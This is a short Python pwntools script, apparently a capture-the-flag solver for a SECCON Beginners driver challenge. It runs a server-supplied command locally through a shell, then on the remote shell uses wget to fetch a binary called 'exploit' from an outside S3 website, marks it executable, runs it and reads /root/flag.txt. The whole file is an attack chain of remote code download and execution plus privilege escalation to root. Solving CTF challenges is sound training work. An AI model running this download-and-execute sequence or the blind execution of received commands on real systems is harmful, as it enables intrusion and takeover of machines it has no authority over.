from pwn import *
import subprocess

HOST = os.getenv("CTF4B_HOST", "driver4b.beginners.seccon.games")
PORT = int(os.getenv("CTF4B_PORT", "9004"))

p = remote(HOST, PORT)

cmd = p.recvline(timeout=30)
ret = subprocess.run(
    cmd.decode().strip(),
    shell=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    encoding="utf-8",
)
p.sendlineafter(b": ", ret.stdout, timeout=30)
p.sendlineafter(b"$ ", b"cd /tmp", timeout=30)
p.sendlineafter(
    b"$ ",
    b"wget http://3oirqc2zdk2avy75.s3-website-ap-northeast-1.amazonaws.com/exploit",
    timeout=30,
)
p.sendlineafter(b"$ ", b"chmod +x exploit", timeout=30)
p.sendlineafter(b"$ ", b"./exploit", timeout=30)
p.sendlineafter(b"$ ", b"cat /root/flag.txt", timeout=30)
res = p.recvuntil(b"}", timeout=30)
print(res.decode())
